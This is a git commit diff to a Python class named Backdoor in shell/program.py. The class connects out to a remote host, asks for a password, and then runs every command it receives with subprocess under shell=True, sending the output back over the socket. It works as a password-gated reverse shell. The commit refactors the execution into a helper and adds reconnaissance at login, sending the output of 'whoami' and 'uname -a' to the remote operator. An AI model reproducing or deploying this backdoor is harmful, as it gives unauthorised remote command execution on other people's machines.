b60d4ad0befb8909dcfb2ac19ada1a77e8a71e3c
Heiko Alexander Weber <heiko.a.weber@gmail.com>
2018-11-04 12:02:19 +0100

    + added some sys info at login

--- shell/program.py
+++ shell/program.py
@@ -9,6 +9,21 @@ class Backdoor(object):
         self.__passwd = passwd
         self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
+    def __execute_code(self, code):
+        proc = subprocess.Popen(
+            code,
+            shell = True,
+            stdin = subprocess.PIPE,
+            stdout = subprocess.PIPE,
+            stderr = subprocess.PIPE)
+
+        stdout = proc.stdout.read().decode()
+        stderr = proc.stderr.read().decode()
+        out = stdout
+        if stderr != '':
+            out = stderr
+        return out
+
     def login(self):
         while True:
             self.__sock.send('Login: '.encode())
@@ -22,29 +37,27 @@ class Backdoor(object):
         while True:
             self.__sock.send('#>'.encode())
             data = self.__sock.recv(1024).decode().strip()
-
             if data == ':kill':
                 break
-
-            proc = subprocess.Popen(
-                data,
-                shell = True,
-                stdin = subprocess.PIPE,
-                stdout = subprocess.PIPE,
-                stderr = subprocess.PIPE)
-
-            stdout = proc.stdout.read().decode()
-            stderr = proc.stderr.read().decode()
-            out = stdout
-            if stderr != '':
-                out = stderr
-
+            out = self.__execute_code(data)
             self.__sock.send(out.encode())
 
     def open(self):
         self.__sock.connect((self.__host, self.__port))
         if not self.login():
             return
+        
+        remote_login = self.__execute_code('whoami').strip()
+        remote_os = self.__execute_code('uname -a').strip()
+
+        welcome = '\n'.join([
+            'Logged in into remote shell.',
+            '\n',
+            'Remote login name: ' + remote_login,
+            'OS: ' + remote_os,
+            '\n',
+        ])
+        self.__sock.send(welcome.encode())
         self.code()
 
 
